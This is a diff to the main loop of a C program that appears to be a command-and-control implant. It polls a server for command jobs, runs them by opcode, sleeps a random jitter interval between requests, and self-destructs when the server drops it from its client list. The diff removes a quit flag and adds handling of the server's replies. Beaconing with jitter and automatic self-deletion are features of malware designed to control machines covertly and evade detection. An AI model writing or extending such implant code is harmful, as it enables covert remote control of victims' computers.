@@ -40,7 +40,6 @@
 // clang-format on
 
 bool   should_jitter = true;
-bool   should_quit   = false;
 job_t *job           = NULL;
 
 void cleanup() {
@@ -88,20 +87,48 @@ int main() {
   }
 
   // ask for jobs and handle them
-  while (!should_quit) {
-    if (!job_recv(job, true))
+  while (true) {
+    switch (job_recv(job, true)) {
+    // server returned the rest of the data for an older job
+    case JOB_RECV_OK:
+      debug("received packet for an older job, requesting again immediately");
+      continue;
+
+    // server returned no jobs, we have nothing to do
+    case JOB_RECV_NONE:
+      debug("no available jobs, requesting again");
       goto next;
+
+    // failed to connect to the server or failed to receive any valid packets
+    case JOB_RECV_FAIL:
+      debug("failed to get a job, requesting again");
+      goto next;
+
+    /*
+
+     * server rejected our request, most likely we are no longer a valid client
+     * AKA the server removed us from the client list
+
+     * so lets do the only reasonable thing: commit violent suicide
+
+    */
+    case JOB_RECV_INVALID:
+      debug("job request rejected, self destructing");
+      self_destruct();
+      goto out;
+    }
 
     debug("got a new job (id: %s, command: 0x%02x)", job->id, job->cmd);
     cmd_handle(job);
 
   next:
-    if (should_jitter && !should_quit)
+    if (should_jitter)
       jitter();
     else
       should_jitter = true;
   }
 
+out:
   cleanup();
   return EXIT_SUCCESS;
 }
